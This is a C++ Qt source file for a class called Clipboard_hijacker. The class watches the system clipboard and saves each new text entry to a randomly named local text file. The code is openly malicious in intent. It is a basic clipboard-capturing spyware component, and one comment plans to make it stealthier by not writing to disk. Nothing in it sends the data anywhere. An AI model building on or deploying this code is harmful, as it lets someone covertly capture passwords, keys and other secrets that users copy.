#include "clipboard_hijacker.h"
#include <QtWidgets>
#include <QApplication>
#include <QLabel>
#include <QDebug>
#include <QCryptographicHash>
#include <QRandomGenerator>


Clipboard_hijacker::Clipboard_hijacker()
{
        const QClipboard *clipboard = QApplication::clipboard();
        QString clipboardText = clipboard->text();
        connect(QApplication::clipboard(), SIGNAL(dataChanged()),this, SLOT(clipboardhasChanged()));
        //testing if it works
}
/*
void Clipboard_hijacker::hijack(QClipboard *clipboard)
{
    const QMimeData *mimeData = clipboard->mimeData();
    QLabel labelforimages;


}
*/
void Clipboard_hijacker::clipboardhasChanged()
{
    //QRandomGenerator *randomNumber;
    qDebug() << "well i'm there";
    //qDebug() << randomNumber;
    QString filename = QString::number(QRandomGenerator::global()->generate());
    //qDebug() << randomNumber->generate();
    qDebug() << "entered";
    //qDebug() << randomNumber;
    while(QFileInfo::exists(filename))
    {
        filename=QString::number(QRandomGenerator::global()->generate());
        qDebug() << "file exists"<< endl;
    }
    //From there, filename has to be unique, avoid colisions (here it's useless but implemented for maybe later use since we could rewrite data in the file)
    QFile *file = new QFile(filename+".txt");
    qDebug() << filename;
    if(!file->open(QIODevice::ReadWrite))
    {
        qWarning("Couldn't save the file");
    }
    QTextStream out(file);
    out << this->getclipboardString();
    qDebug() << this->getclipboardString();
    return;
    //TODO use md5 to produce unique filename to avoid conflicts in filename, besides could avoid writing to filesystem to improve stealthiness)s
    //QByteArray hash = QCryptographicHash::hash(QClipboard::text(QClipboard::Clipboard).toLocal8bit(), QCryptographicHash::Md5);
     
}

QString Clipboard_hijacker::getclipboardString()
    {
        QClipboard *clip = QApplication::clipboard();
        return clip->text();
    }

QImage Clipboard_hijacker::getclipboardImage()
{
    QClipboard *clip = QApplication::clipboard();
    return clip->image();
}
const QMimeData* Clipboard_hijacker::getMimeData()
{
    QClipboard *clip = QApplication::clipboard();
    return clip->mimeData();
}
bool Clipboard_hijacker::checkchanges(QString oldString, QString newString)
{
    if(QString::compare(oldString,newString))
    {
        return true;
    }
    return false;
}
Clipboard_hijacker::~Clipboard_hijacker()
{

}

